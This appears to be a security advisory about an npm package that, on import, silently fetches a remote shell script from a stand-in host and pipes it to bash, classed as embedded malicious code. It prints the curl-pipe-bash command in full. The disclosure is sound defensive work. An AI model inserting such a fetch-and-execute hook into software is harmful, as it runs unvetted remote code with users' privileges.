summary: Import-time curl|bash remote code execution in @wacrot/infra-data-kit
details: On module load, src/index.js invokes addSupport() which detach-spawns `bash -c "curl -fsSL https://example.com/script.sh | bash"`. Any consumer that require()s or imports @wacrot/infra-data-kit triggers a remote fetch-and-execute via shell pipe at import time. The child is detached with stdio:ignore and errors are swallowed via try/catch and.catch to suppress output. The package's stated purpose is GeoJSON/CSV/shapefile normalization, which has no legitimate need to pipe a remote shell script to bash. The remote URL is unpinned and mutable — whatever bytes the host serves at fetch time will execute on the installer's machine with the user's privileges. package.json also declares a postinstall hook (`../scripts/setup-env.sh`) referencing a script that is not shipped in the tarball; that hook is unrelated to the payload but indicates a sloppy/hostile manifest.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
